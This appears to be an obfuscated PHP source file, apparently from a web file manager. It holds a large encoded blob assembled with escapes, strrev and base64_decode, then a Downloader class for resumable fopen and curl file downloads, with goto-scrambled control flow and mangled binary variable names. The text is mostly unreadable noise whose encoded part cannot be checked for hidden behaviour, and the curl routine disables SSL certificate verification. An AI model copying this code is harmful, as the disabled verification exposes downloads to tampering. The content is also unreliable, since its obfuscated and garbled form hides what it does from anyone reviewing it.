b1\x8a\x46\x5c\xc9\xd3\x67\x7\x7\xe0\x24\xd3\x32\xec\xbd\x67\xc4\xa8\xc0\xc0\x7\x84\x67\x95\x75\xfb\xd2\x10\xb2\x71"."\153\322\260\70\345\324\144\264\241\356\173\34\356\103\100\336\61\326\16\270\374\347\125\230\106\73\13\143\142\126\26\257\107\137\301\134\214\201\155\210\240\100\214\11\46\171\52\147\202\302\70\66\116\143\350"."\x71\xb8\xe\x35\x6a\x19\xf8\x4a\xa1\x85\x78\x1b\x86\x30\x4\x7d\x24\xa3\xd2\x49\xf\xf3\x43\xb3\x20\x17\x2\xba\x38\x63\x86\xf9\x30\x22\xcb\x47\xbc\xd4\x35\xfa\x70\xd1\x2a\x44\xa1\x30\x7b\xab\xa0\x5d\x48\x23\x9d\x15\x7a".strrev('”À-rX‹äŸ€J>‚^¢àÊ87Ğ„rŸ	ÈË]l±F=F&Q›XK0_^©ÎV')."\x27\x4e\xba\x88\x7f\xef\xca\x8a\x95\x84\xe9\xc2\x8a\x88\xd\x7\x97\x39\xbc\xa3\x59\x50\x47\x35\xe\x56\x6a\xb0\xa7\x1f\xb3\xd9\x1b\xba\x56\x62\xfb\xe\x7c\xb3\x57\x59\xe1\xa0\x1\xe6\x9\x84\x5c\x4\x11\xab\xe4\x3c\x5a".strrev('23Ú—Š—}”UyÏéQ’”ÙcI?x,ÒrÚÄ‚Äğ\'­Š€…Õã	î€|Áç	+†“¦').base64_decode('VJosHL+LVY9g2yoCGY1k1RQ+T0G2UhQ+Ngk8ljKgl6G4GNfS8BZSYZU0gFQPuNEQxUkaqpqxQQ==').strrev('ÛÃ„”KRF'."\r".'ĞÛ7ˆ‹u'."\n".'™ÄZ¬…¦öyñ]ñ»!já‹WI-]D·œ@ ‚€ì©(jœ©¢')."\273\222\11\131\52\325\215\160\105\236\1\101\305\106\100\207\167\330\350\332\102\110\11\350\226\360\202\72\173\245\16\46\45\122\124\325\313\327\331\26\151\355\360\165\107\320\56\300\337\25\162\167\24\44\0".base64_decode('nhnytRSB+VPkBbWOpu2qaFoGLfPd3KFH2iTtQu9QM++HxJEYyQxtD3BwwcKo4aLmVVFhc2SmlQ==')."\24\123\170\162\121\205\162\227\231\43\262\2\161\373\320\341\43\223\310\105\366\202\35\132\224\214\167\167\113\307\12\320\26\150\244\357\17\270\3\313\271\127\113\220\22\162\7\46\111\201\171\210\13\51\352"."\325\150\301\242\105\213\350\343\252\261\24\222\273\234\320\6\201\335\255\3\50\74\251\122\213\241\112\61\46\324\321\103\46\111\266\273\371\200\142\270\161\13\112\44\256\320\262\223\44\152\131\372\66\31\175"."\x74\x5d\xcd\xe6\xe8\xc5\x37\x3b\x7a\x13\x7c\x71\xcc\x25\xbf\xa3\xe4\x37\x3a\x4e\xe8\x5b\x31\x88\x9e\x41\x4c\x21\xf9\x35\x93\x9c\xa5\x25\xc7\xa1\x1e\x1c\xd\x83\x25\x27\xc5\xcf\x3c\x91\x66\x70\xbf\xd4\xa2\x64\x66\x5a\x92"."\37\240\55\220\72\241\115\124\46\51\215\203\226\143\307\251\46\167\44\140\16\250\251\124\4\252\304\221\352\306\6\164\251\160\263\111\243\223\177\203\27\103\300\71\252\317\1\271\50\250\40\241\102\62\245"."\x5\xcd\x0\x6e\x1e\x4f\xcc\x8\x9d\x4e\xa2\xe4\x3\xcd\xad\x1\x57\xb1\x23\x21\xbf\x75\xd4\x8e\x1a\x1d\x31\x44\x0\xc3\x13\x3c\x9a\x41\x91\x49\x82\x6b\xc\xb2\x53\xb0\xf9\xa8\x58\xac\xc7\xc9\xb0\xd5\x63\xff\x14\x71\x75"."\164\201\204\274\256\20\367\267\245\35\235\240\317\110\340\63\320\352\114\302\317\5\332\24\10\61\102\21\244\336\246\207\210\23\212\53\74\243\252\272\112\260\271\360\265\170\203\221\23\203\320\123\136\207\217"."\272\276\260\47\370\100\132\50\60\111\212\73\60\131\212\277\371\304\111\122\132\350\106\302\236\322\341\367\7\105\367\52\5\325\353\351\26\334\203\221\215\62\134\304\251\173\372\256\236\16\302\310\302\204\202"."\303\204\51\267\20\365\247\160\156\106\125\35\265\46\342\257\265\301\276\211\10\357\241\342\343\65\34\326\321\126\15\207\245\230\202\315\126\242\52\26\17\324\70\164\15\10\153\47\211\117\163\117\203\176\77"."\x5d\xae\x72\xe7\xac\x8a\xe9\xd3\xd2\x22\x2c\x5c\x9\x81\xe1\x4a\xd7\xb4\x1e\x52\x8d\x69\x1c\x6\x10\xa6\x33\xb8\x6b\x65\x79\xd9\xc4\xcc\xa\x67\x65\x79\xb8\xba\x82\xa9\x77\x85\xa9\x35\x1b\x7c\xe4\x1b\x2b\x47\xf5\xaf\xae".base64_decode('W8O9kIX7nJXh/umCttlqAFjDACMD9OwMmbszLLOyvK9sZr+zsm9lONwPgxUAVg/h4aCzskJumg==')._kodDe('L9ndO8AOAEHqA4xjdqQoulZ6oRfvV6qqT9tzMxDJ1B5duU+ccYSB+b36Ux6smLzEAiC6HXMoGKk=').base64_decode('CKIgtQ7LcjV7u7Iti9pmS5XUDGQ2KVdKiR0q/IuWVLOEgiKiEzUEEf3zw7jwOKBQVyC4CZ4hYA==')."\101\324\161\12\221\10\24\163\140\22\117\42\330\212\37\64\100\250\23\142\55\116\270\363\27\26\332\366\2\217\70\144\77\125\334\207\70\14\10\231\114\55\204\7\76\205\66\70\324\271\1\327\32\37\211"."\222\36\200\175\34\51\370\140\47\65\13\117\11\373\122\256\57\203\304\12\256\261\105\243\124\126\212\51\131\170\267\23\307\247\350\240\343\311\267\131\250\247\33\72\240\202\234\40\102\317\133\5\220\257\313"."\27\11\372\126\170\213\22\240\127\320\322\51\140\275\17\371\250\34\44\300\273\374\310\347\223\15\336\323\265\270\313\337\133\12\65\324\331\315\145\11\41\251\305\335\25\212\10\233\123\274\153\1\173\57\266".strrev('e“Î<A’sIi†ÉÜ<|nŸÃLG¾-Ñà¦ÏÍt)™=B¢BùŒÓe[V#1í*¡m')."\251\344\141\16\333\131\31\112\306\114\250\106\301\71\145\124\313\50\324\257\141\232\176\73\315\154\332\240\307\30\352\125\3\331\237\121\311\100\274\347\316\262\313\102\142\364\145\200\124\43\16\55\224\204\303"."\xbb\x8c\x15\x50\x93\x62\xb4\x43\x67\xfa\x7d\x68\x35\x2f\x51\x4\x7c\x3\x43\x30\x34\x81\xbb\x15\x77\xcc\xca\x89\x6f\x6d\x8\xaf\x1\x83\x98\xf0\xaa\xb2\x60\x6c\xe7\xa8\x96\x58\x8b\x22\xb8\x64\x1c\x99\x25\x24\x60\x4d\xf2"."\22\6\173\122\115\155\375\354\371\340\177\62\45\241\341\25\236\274\320\315\146\46\230\213\62\347\27\5\26\166\324\171\240\44\332\266\121\333\122\130\0\172\364\1\266\300\24\323\100\261\360\61\120\336\62"."\61\13\372\146\121\26\234\6\115\320\70\53\23\123\114\250\274\325\103\305\256\122\51\45\76\205\222\204\36\215\321\15\35\131\212\110\47\56\347\175\145\321\376\256\161\320\147\152\164\321\53\26\66\140\43"."\235\353\250\221\4\362\202\274\107\240\10\174\54\301\272\221\333\137\246\70\216\16\275\52\10\166\112\334\344\17\77\77\301\206\26\275\123\301\142\206\140\16\246\306\351\320\241\67\37\112\256\45\30\210\36"."\x85\x28\x69\x30\x85\x3b\xb\x26\x7b\x6c\xee\xf5\xc8\x9b\xcd\xc2\xc7\xec\x39\xc\xec\x55\x4c\x7c\x91\x1a\x65\xe1\x75\xe2\x5e\x7\x1\x48\xc7\xaf\x40\xb\x8d\xe4\xbe\xa9\xf0\x83\x15\xd4\x65\xa2\x3b\x1e\x2f\x4\x87\x74\x6"."\x2c\xf6\x6f\xe5\x64\xce\x1e\x89\x33\x65\xb0\xd3\xc\xfa\xfc\x5d\xe5\x15\x50\x62\xb2\xb9\x19\xe8\x1c\x63\xee\x6e\xc1\xa8\xa0\x35\xb9\x53\x19\xe5\x9d\xce\x22\x34\x95\xd1\x9c\x69\x8b\x60\x6f\x6d\xb6\xdc\xc\xc4\xb0\x46\xd4".base64_decode('KGPBhCm2d7sYqJl2E3vpgJglQ9/SYqF+In+OYHsnwhfrmec6ur0ZSWsxqcPfBjfZHl9wsZRULQ==')."\211\13\65\350\66\302\76\213\221\217\10\164\172\107\211\70\312\336\40\207\101\7\72\351\160\210\236\146\114\266\343\20\75\333\51\354\45\171\241\140\74\352\142\161\360\230\304\21\147\246\254\5\270\124\10"."\50\312\41\176\137\310\3\167\54\366\171\217\300\144\57\143\57\147\114\205\7\376\245\277\235\53\361\135\202\237\342\207\44\102\6\55\223\327\114\215\117\151\332\125\143\42\176\121\137\242\246\10\10\161\361".base64_decode('1Xrerew7RXbHPI5xyGM3pvjKeCGcWZ3D91aKFgDoCwGsrlwVLkt9upDbd/aAN44KF9m2l6dIMg==').base64_decode('2PwpGqV+HBZyBHxt7aHJiivC1uL8WamCymhxKiCyp3bwY90tRKnHVif+/Dt5xQc928NdN6IgEA==')."\x21\x65\x78\xb4\x85\x2a\x20\xbc\xf3\x1d\x41\x77\xc8\x64\xa6\x69\x3a\xb2\x3c\x25\xe6\x9b\x18\xe6\xf3\x47\xf0\x23\x27\x38\xea\x2a\x94\x8a\xd1\x73\xda\xd8\xe0\x88\x31\xa1\xe5\x69\x17\x3d\x6e\x64\x6e\x77\xe1\xa9\xb3\x77\x94".strrev('é¾=y<l4…Ô…» Û«6ä*¤C<M¸“H.1qbl(…£‹+Ck>‘˜ScsÑiİT')."\xe3\x4d\x67\x2d\x9b\xd\x73\xbb\x66\x72\x57\xf0\x48\x32\xe0\x3b\x20\x28\x6e\xe9\xe9\xb1\x22\x80\xcd\x48\xbe\x83\x56\x83\x39\x4b\x84\x56\x26\x99\x84\x2e\xb6\xc\x71\x31\x2f\xe0\x16\x32\xa\x61\xdb\x68\x19\x9e\x52\x5b\xdd"."\x85\xaf\xc8\x93\xec\x93\x96\x25\x57\xc9\x25\x58\xbf\x8d\xd3\xdb\x98\x26\x8a\x8\x4\x85\xac\x53\x5\x9f\xca\xf4\x17\x7a\xd1\x61\xb2\x25\xac\x93\x20\x84\x10\x8b\xa6\x30\xf9\xa5\xfc\xb1\xb0\x68\xfc\xc0\x3d\xd2\x1e\xa1\x94".strrev('XP~Ûº¡´by—Ñ'."\0".'oi¼*3›)ØÖÕ€t	¦›HØ²X'."\0".'ÒWÇË9•u#WW*‰E£')."\xe0\xff\x85\xac\x7d\xd8\x17\x4c\x2e\xe3\xc3\x6e\x49\x6c\x50\x43\x10\xad\x45\xff\x9d\xd8\xab\xc\xf7\x90\x4c\xd0\xc1\xd7\xba\xb1\x27\x1c\x32\x33\xc5\x22\xa9\xc3\x21\xf4\x3\x85\x6f\x40\xb8\xcc\xc8\xd9\x55\xec\xa0\x8\x3a"."\215\143\242\5\167\272\70\244\43\11\326\51\312\276\4\101\132\50\321\211\143\132\42\101\41\131\5\110\52\62\12\40\52\25\5\250\322\120\33\225\42\24\66\140\350\235\61\66\166\260\107\311\217\107\115".strrev('?Ê¤û%w‚\\áv2=ñ–¹;™/…ˆ3D5 vf‹‘™FÜe nèè£	€›OôCùÆÑ0')."\153\30\22\77\156\223\362\12\5\74\326\113\5\31\2\205\75\31\322\213\75\43\160\217\114\231\134\232\273\276\2\21\273\160\213\305\172\352\123\342\173\232\233\63\122\62\122\241\225\351\353\122\62\176\345"."\120\266\25\201\52\24\261\204\6\63\111\253\140\270\212\76\366\43\112\47\256\166\220\260\13\304\6\267\31\120\371\311\357\362\164\274\246\166\366\174\161\177\307\273\236\273\230\301\65\64\204\214\344\60\236"."\x28\xec\xd0\xc3\x2d\x36\xbc\x92\x9d\x5a\x24\xfa\x8\x9e\x38\x3f\x51\xa2\xdd\x5f\x28\x79\xc2\x50\xe0\x65\x5\x5c\xe8\x47\x11\xb5\xbb\x94\x40\x89\x33\x9\x67\x50\xac\xe4\x2c\x67\xfd\xa5\xbe\xf2\xff\x5f\xf\xbb\x3b\x35\xb2"."\223\363\60\51\122\20\375\104\41\225\327\36\277\341\366\343\277\117\345\57\305\356\55\13\245\332\47\260\160\160\240\132\176\150\312\116\306\104\220\347\371\363\51\302\52\5\313\162\213\102\152\261\220\115\351".base64_decode('n6srIbfY3OsFIhIbwTANNsPmbBoVFEKNnKxotMsj9SUUg+69kQc6dxtzHA7vBHkVYIxPdkvnKQ==')."\x96\xe0\xd9\x1a\xb2\x7\x3f\x3d\xf7\x2\xdb\x44\x9b\x84\x8\xe2\xdc\xc6\x48\xa0\xfb\x78\x1\x50\x5c\xc9\x85\x99\x5\xe8\x5b\x13\xa4\x3c\x22\xfe\x70\x31\x2\x35\x54\xf0\xcb\x43\x36\xa2\xbc\xa7\xdc\x64\xc2\xc4\x65\xf1\x7d".base64_decode('RxBlhEL4Mpl5yHco/qzAhTnD5aEuqoYPI8KRCpLKWOKAKLDBl0DsogmrBXpGqxTN4kpAQiRLAQ==')."\xa\x6a\x26\x76\x85\x3\xf5\x74\x91\x79\x2c\xcc\x43\x7a\xcf\x3e\x53\x51\x83\xbe\x67\x3d\x81\xc5\x31\xdf\xb5\x24\x22\x3a\xd6\x16\xd6\x2b\xfc\x49\xc\xde\x57\x4c\x25\x94\x25\xdb\x62\x24\xc2\x5\x25\xa4\xf5\x2c\xdc\xca\xa0"."\70\163\60\116\237\165\241\257\275\50\314\11\13\364\56\303\266\51\370\324\206\240\244\122\334\361\217\370\300\101\52\252\30\116\100\141\103\226\116\37\353\55\21\21\133\131\102\272\316\150\261\241\22\376\166"."\x60\x6f\x43\xe5\x16\x81\x43\xa2\x2b\xef\x49\xd0\x38\x7\xa9\x5f\x18\x65\x4a\x69\x34\x54\xec\x98\xa8\x59\x10\x8\x83\xc4\x33\x51\xd1\x5c\x67\xe4\x2a\xe2\x71\x7e\x88\xe3\xf0\x41\x49\xfb\x3e\x4a\xfc\x1a\xbe\x84\x84\x7b\x85"."\x0\x14\xeb\x9d\x93\xc\x76\x69\x9a\xd2\x4c\x7c\x20\x25\x4a\xba\x20\x24\xd6\x9d\x12\x65\xb7\xa1\xa3\x95\xca\xe\x65\x9b\xf\xc1\x70\x46\xd0\x58\x9\x16\x4e\x6b\x4b\xb7\xf5\x2\x10\xf\x85\xc3\x60\xfc\x64\x18\x7e\x30\x16"."\276\167\4\46\267\24\354\351\54\107\136\162\41\0\171\210\101\317\316\254\42\13\347\52\151\212\44\374\207\37\37\52\207\311\260\220\125\222\257\213\77\5\131\41\361\107\163\304\147\160\341\151\112\253\316"."\x28\xc8\xee\xe1\xdb\x54\x6c\x77\x4b\x80\x42\x1a\x4b\xa1\xc5\x74\xc3\x14\xd0\x84\xb7\x49\x96\x40\xdf\xc4\xb4\xb5\x90\x30\x58\x1e\xd2\xdf\xe2\xcb\xcf\xf6\x42\xc1\xf0\x6\x2d\xdb\x40\xf0\x67\x75\xb\x9f\xd3\x45\xbb\x8\xbc".strrev('ã%'."\0".'7î>ßBü'."\0".'ê.Q’ëNn&‹V\'³ŠµŠ8A)~ú`DJ)“İ³Î 4ˆ:ˆí°1').strrev('ˆ'."\n".'\\ÑƒG(2‰—?¼Lµ›Äf€ÖÂµgqş‰j'."\n".'1”a%ÇdC„p›lz¹…a^w%Ã')."\22\274\53\241\344\371\101\53\27\213\342\361\126\45\137\2\225\331\362\62\50\200\60\124\264\346\13\257\14\160\107\267\352\210\310\312\11\136\242\270\72\20\261\30\312\137\41\50\154\25\232\22\14\116\316"."\xb6\x33\x82\x1f\x2f\x42\x54\x1c\x84\x5f\x58\x66\x8e\xda\x70\x51\x86\x8e\x32\x2a\x71\xee\xc1\xd\xd7\x91\xed\x43\xf8\x27\xed\x8f\x25\x30\x34\x26\x8f\x0\x1c\xa4\xf2\xec\xb0\x41\xb\x7c\xed\xc2\xb3\x19\xba\xa8\x14\x24\x91".base64_decode('TZBQfMm9km3AO4TixOP1STMES3+EU6W9i4MFh/oF3JEjEzHRVrKNd7LGEsyAmGirYuFwI1mX0w==')."\x2a\x6\xa6\xd1\x41\x9\x4e\x73\xdb\x93\x30\xbe\x5a\xd0\x22\x31\x43\x61\x6b\x71\xe\xa3\xa8\xcf\x48\x9e\xd2\x9f\x2e\xfc\x0\xed\xb2\xc2\xcb\x2b\x5e\x88\x70\x6c\x54\x74\xb3\x16\xd2\x4b\xe4\xc1\x35\x2a\x99\xd\x27\xc1\x9c".base64_decode('XGCx5RW3dTwbfDTcnKSGxe1Hs6Og9aTO3M+1gDpZl5RELv4cGf9CbLRVK12LktvKyWpREnnSWg==')."\x70\xec\x82\x7b\xb2\x52\x6c\x8e\xa6\x94\x60\x6c\xfc\x5a\xab\x98\x85\xf2\xb4\x12\x97\x6c\xb8\x4c\xb8\x8a\x6\x6c\x3a\x65\x45\xc9\xe2\x8d\x5d\xe9\x3b\xbd\x40\xc9\x89\x68\xda\x2f\xdb\xa\xe0\x62\xc7\x50\xed\x80\x6d\x67\x9c"."\276\143\363\371\276\156\211\6\104\260\215\361\346\62\103\31\352\242\7\174\201\73\76\144\137\241\102\131\201\147\127\112\221\231\234\340\115\264\244\153\130\31\356\353\212\67\116\51\352\247\11\35\225\201\375"."\xba\x16\x13\xae\xec\x21\x50\xf4\xf7\x8a\xd3\xd9\x89\x2\x5e\xc5\xf1\xf5\x8c\x47\x54\x3b\x45\xd5\xd2\xe0\xb3\xbe\xec\xa\xcc\x76\xdf\x53\x22\xdd\xc9\x8f\xcf\x44\x87\xbd\x36\xdf\xc1\x10\xc5\xc3\x4c\x90\xf1\xe2\x4b\xe\x13"."\361\31\70\122\257\40\220\346\61\270\107\220\361\232\206\223\203\272\141\101\323\144\300\167\263\350\267\131\267\54\312\16\200\160\212\60\221\40\206\74\237\10\227\175\40\44\51\202\23\135\3\235\143\42\202"."\x44\x8c\x3\x5\xc9\x69\x3c\xdc\x3d\x5\x55\x9c\x8a\x98\x91\x2d\x2\xcf\x47\x59\x44\x5c\x77\x86\xf4\x78\x54\x1f\x25\xe3\x8a\x5e\x35\xe0\x5f\x83\xc7\x94\xa4\xd1\x85\xa2\x14\x77\x97\x4f\x68\x49\xbc\x98\x44\xda\x3e\xa6\xb".base64_decode('p7iIZrADleEgL2ExzSCSPY6mB/OG+H0lkPMgXgR+TRSdXMBHeL3LfMFQsCip2x0M9voDHqxdWA==').base64_decode('lIxyCbfARUnd7f6uydK8nW5fR1EavBWGOo/0lTac5OtGtXR3dFAVo+Ja+FoW85qgCw9+sJcd0A==')."\63\2\225\12\352\17\364\64\63\250\320\11\1\131\70\235\66\142\130\115\263\123\24\241\70\373\6\127\34\162\223\276\42\310\2\331\42\151\137\130\256\341\55\156\27\51\54\100\235\376\301\207\131\331\354"."\146\62\51\152\234\250\356\201\337\245\26\22\361\262\157\273\22\22\340\150\212\40\36\43\20\247\270\252\42\0\121\125\54\70\222\57\350\130\36\22\326\362\342\353\35\4\341\335\4\133\163\42\165\13\60".base64_decode('qEeFA0PMp2wcSrydx+ECBhYP6SElSXgJFBp4rHlMDIuHFY2MlVhKkl62FvJc4XYR9tf/AxfUnw==')."\xf0\xb2\xbb\x0\x0".base64_decode('').base64_decode('').base64_decode('').base64_decode(''), 10, -8))); goto BÈÆÙ“ËÆ¦; cöâšÍÚ±: class Downloader { static function start($Dƒ›ñäÄÒã, $fßŠ™Áò—è, $CØíİ²†Çº = 10) { goto dà‹Ê‹İ; dà‹Ê‹İ: $B£ÌÎÎê÷ì =& $_SERVER[‘®…¢À]; if (!request_url_safe($Dƒ›ñäÄÒã)) { return array($B£ÌÎÎê÷ì[990] => !1, $B£ÌÎÎê÷ì[992] => $B£ÌÎÎê÷ì[995]); } $C­øëäÍñ = $fßŠ™Áò—è . $B£ÌÎÎê÷ì[1410]; goto fé‘ ™ÀÑ; fõäÀ„¸¤: $D²¤™¹œ¾Ë = intval($f¿†¤„œ¶®[$B£ÌÎÎê÷ì[322]]); if (file_exists($Bºó”¹Éì) && time() - filemtime($Bºó”¹Éì) < 3) { return array($B£ÌÎÎê÷ì[990] => !1, $B£ÌÎÎê÷ì[992] => $B£ÌÎÎê÷ì[1412]); } $då¥„±Ù = array(); goto Fİ·ñˆõ–; a‹ŞÙÑÛÙ: if ($aÏÆÃ±ªæ… > $D²¤™¹œ¾Ë) { @unlink($Bºó”¹Éì); } file_put_contents($C­øëäÍñ, json_encode($då¥„±Ù)); $a‘•–î­‰ = self::fileDownloadCurl($Dƒ›ñäÄÒã, $fßŠ™Áò—è, !0, $aÏÆÃ±ªæ…, $D²¤™¹œ¾Ë); goto EÜë‹ƒ»ˆå; fé‘ ™ÀÑ: $Bºó”¹Éì = $fßŠ™Áò—è . $B£ÌÎÎê÷ì[1411]; if (is_array($Dƒ›ñäÄÒã)) { $f¿†¤„œ¶® = $Dƒ›ñäÄÒã; } else { $f¿†¤„œ¶® = url_header($Dƒ›ñäÄÒã); } $Dƒ›ñäÄÒã = $f¿†¤„œ¶®[$B£ÌÎÎê÷ì[292]]; goto EÏæáŒÇ‘“; EÏæáŒÇ‘“: if (!$Dƒ›ñäÄÒã) { return array($B£ÌÎÎê÷ì[990] => !1, $B£ÌÎÎê÷ì[992] => $B£ÌÎÎê÷ì[995]); } if (!$f¿†¤„œ¶®[$B£ÌÎÎê÷ì[1192]] || $f¿†¤„œ¶®[$B£ÌÎÎê÷ì[322]] == 0) { @unlink($Bºó”¹Éì); @unlink($fßŠ™Áò—è); $a‘•–î­‰ = self::fileDownloadFopen($Dƒ›ñäÄÒã, $fßŠ™Áò—è, $f¿†¤„œ¶®[$B£ÌÎÎê÷ì[322]]); if ($a‘•–î­‰[$B£ÌÎÎê÷ì[990]]) { return $a‘•–î­‰; } else { @unlink($Bºó”¹Éì); @unlink($fßŠ™Áò—è); $a‘•–î­‰ = self::fileDownloadCurl($Dƒ›ñäÄÒã, $fßŠ™Áò—è, !1, 0, $f¿†¤„œ¶®[$B£ÌÎÎê÷ì[322]]); @unlink($Bºó”¹Éì); return $a‘•–î­‰; } } $aÏÆÃ±ªæ… = is_file($Bºó”¹Éì) ? filesize($Bºó”¹Éì) : 0; goto fõäÀ„¸¤; Fİ·ñˆõ–: if (is_file($C­øëäÍñ)) { $cçÑÕ³ÕòÔ = file_get_contents($C­øëäÍñ); $då¥„±Ù = json_decode($cçÑÕ³ÕòÔ, 1); } if (file_exists($fßŠ™Áò—è) && $D²¤™¹œ¾Ë == filesize($fßŠ™Áò—è)) { @unlink($Bºó”¹Éì); @unlink($C­øëäÍñ); return array($B£ÌÎÎê÷ì[990] => !0, $B£ÌÎÎê÷ì[992] => $B£ÌÎÎê÷ì[1413]); } if ($då¥„±Ù[$B£ÌÎÎê÷ì[322]] != $D²¤™¹œ¾Ë) { $då¥„±Ù = array($B£ÌÎÎê÷ì[322] => $D²¤™¹œ¾Ë); } goto a‹ŞÙÑÛÙ; EÜë‹ƒ»ˆå: if ($a‘•–î­‰[$B£ÌÎÎê÷ì[990]]) { @unlink($C­øëäÍñ); } return $a‘•–î­‰; goto C¸íÔÖ´îß; C¸íÔÖ´îß: } static function fileDownloadFopen($a’¬‡Ÿì³ß, $bãóÔÚÇÜ†, $bÓĞ“²´Âƒ = 0) { $e÷òÏª‡ =& $_SERVER[‘®…¢À]; @ini_set($e÷òÏª‡[1414], $e÷òÏª‡[1415]); $B“ö¥š© = $bãóÔÚÇÜ† . $e÷òÏª‡[1411]; set_timeout(); @unlink($B“ö¥š©); if ($BŒ±ŠÈãØ = @fopen($a’¬‡Ÿì³ß, $e÷òÏª‡[1416])) { goto BèÖ™¦¨Ì…; BèÖ™¦¨Ì…: if (!($aÏ±Óöö”‡ = @fopen($B“ö¥š©, $e÷òÏª‡[1417]))) { return array($e÷òÏª‡[990] => !1, $e÷òÏª‡[992] => $e÷òÏª‡[1418]); } while (!feof($BŒ±ŠÈãØ)) { if (!file_exists($B“ö¥š©)) { fclose($aÏ±Óöö”‡); return array($e÷òÏª‡[990] => !1, $e÷òÏª‡[992] => $e÷òÏª‡[1419]); } clearstatcache(); if ($bÓĞ“²´Âƒ > 0 && $bÓĞ“²´Âƒ == filesize(iconv_system($B“ö¥š©))) { break; } fwrite($aÏ±Óöö”‡, fread($BŒ±ŠÈãØ, 1024 * 8), 1024 * 8); } fclose($aÏ±Óöö”‡); goto BÊé®‡¦º¬; eäË£–“½œ: self::checkGzip($B“ö¥š©); if (!@rename($B“ö¥š©, $bãóÔÚÇÜ†)) { usleep(round(rand(0, 1000) * 50)); @unlink($bãóÔÚÇÜ†); $eîãçà¶å¨ = @rename($B“ö¥š©, $bãóÔÚÇÜ†); if (!$eîãçà¶å¨) { return array($e÷òÏª‡[990] => !1, $e÷òÏª‡[992] => $e÷òÏª‡[1421]); } } return array($e÷òÏª‡[990] => !0, $e÷òÏª‡[992] => $e÷òÏª‡[669]); goto b¢Áºà¡óæ; BÊé®‡¦º¬: fclose($BŒ±ŠÈãØ); $f¿Î³¹ëã = filesize(iconv_system($B“ö¥š©)); if ($bÓĞ“²´Âƒ != 0 && $f¿Î³¹ëã != $bÓĞ“²´Âƒ) { return array($e÷òÏª‡[990] => !1, $e÷òÏª‡[992] => $e÷òÏª‡[1420]); } goto eäË£–“½œ; b¢Áºà¡óæ: } else { return array($e÷òÏª‡[990] => !1, $e÷òÏª‡[992] => $e÷òÏª‡[1422]); } } static function fileDownloadCurl($eÂä¹†í’Ë, $d›½Ô»òà•, $D¡²Ö½®¼ = false, $f²Ò°ğåÓŒ = 0, $D’Š—¬Éò = 0) { goto EÕÁ®¿‡ï›; Fê‡‘ÉÕÏ: return array($D„‡¨È°ä[990] => !1, $D„‡¨È°ä[992] => $D„‡¨È°ä[1425]); goto CÑÃÊò§Ëâ; dß¬±‰§Û: curl_close($bÛŸÀ¢õ‡¾); fclose($A¤È¿‡î·); $c¿­•ÙÕÈ„ = filesize(iconv_system($D…ƒˆ¿Æ¶)); goto C­ëÃÆÉá¸; EË¯‘ô„ÌÄ: curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_NOPROGRESS, !1); curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_PROGRESSFUNCTION, $D„‡¨È°ä[1180]); curl_progress_start($bÛŸÀ¢õ‡¾); goto C±Ä¡ÒŒ¶”; EÕÁ®¿‡ï›: $D„‡¨È°ä =& $_SERVER[‘®…¢À]; $D…ƒˆ¿Æ¶ = $d›½Ô»òà• . $D„‡¨È°ä[1411]; set_timeout(); goto a—Š¹ö‡¸; C±Ä¡ÒŒ¶”: curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_USERAGENT, $D„‡¨È°ä[1415]); $A…šÅãàˆ = curl_exec($bÛŸÀ¢õ‡¾); curl_progress_end($bÛŸÀ¢õ‡¾); goto dß¬±‰§Û; C­ëÃÆÉá¸: if ($c¿­•ÙÕÈ„ < $D’Š—¬Éò && $D’Š—¬Éò != 0) { return array($D„‡¨È°ä[990] => !1, $D„‡¨È°ä[992] => $D„‡¨È°ä[1412]); } if ($c¿­•ÙÕÈ„ > $D’Š—¬Éò && $D’Š—¬Éò != 0) { return array($D„‡¨È°ä[990] => !1, $D„‡¨È°ä[992] => $D„‡¨È°ä[1420]); } if ($A…šÅãàˆ && filesize($D…ƒˆ¿Æ¶) != 0) { self::checkGzip($D…ƒˆ¿Æ¶); if (!@rename($D…ƒˆ¿Æ¶, $d›½Ô»òà•)) { @unlink($d›½Ô»òà•); $A…šÅãàˆ = @rename($D…ƒˆ¿Æ¶, $d›½Ô»òà•); if (!$A…šÅãàˆ) { return array($D„‡¨È°ä[990] => !1, $D„‡¨È°ä[992] => $D„‡¨È°ä[1424]); } } return array($D„‡¨È°ä[990] => !0, $D„‡¨È°ä[992] => $D„‡¨È°ä[669]); } goto Fê‡‘ÉÕÏ; AóË‡ÌÂ‰ß: curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS); curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_SSL_VERIFYPEER, 0); curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_SSL_VERIFYHOST, 0); goto EË¯‘ô„ÌÄ; bŞ¸‰½íõá: if ($D¡²Ö½®¼) { curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_RANGE, $f²Ò°ğåÓŒ . $D„‡¨È°ä[686]); } curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_FILE, $A¤È¿‡î·); curl_setopt($bÛŸÀ¢õ‡¾, CURLOPT_REFERER, get_url_link($eÂä¹†í’Ë)); goto AóË‡ÌÂ‰ß; a—Š¹ö‡¸: $A¤È¿‡î· = @fopen($D…ƒˆ¿Æ¶, $D„‡¨È°ä[693]); if (!$A¤È¿‡î·) { return array($D„‡¨È°ä[990] => !1, $D„‡¨È°ä[992] => $D„‡¨È°ä[1423]); } $bÛŸÀ¢õ‡¾ = curl_init($eÂä¹†í’Ë); goto bŞ¸‰½íõá; CÑÃÊò§Ëâ: } static function checkGzip($còø ÅÌÀ) { goto D®è³áò; eÓ¾†–Åö£: ob_start(); readgzfile($còø ÅÌÀ); $fš¼Úëß¥ñ = ob_get_clean(); goto b¢Æ©‡ÌŒ„; D®è³áò: $Eø¸öºİŸ· = $_SERVER[‘®…¢À][1426]; $D¯„Ò”øÇÎ = file_sub_str($còø ÅÌÀ, 0, 2); if ($Eø¸öºİŸ· != $D¯„Ò”øÇÎ) { return; } goto eÓ¾†–Åö£; b¢Æ©‡ÌŒ„: file_put_contents($còø ÅÌÀ, $fš¼Úëß¥ñ); goto D¿…’ÈÌœ½; D¿…’ÈÌœ½: } } class FileParsePdf { public static function parse($Aê‡­•Æ¹£) { goto D¬™¹†êÀ; b¹Òºƒ“Ãî: preg_match($f£Šßƒ—“Œ, $CÕ»·ˆŒ”[$bÍ—äÁ®Œ´[1429]], $cë¯â„“); if 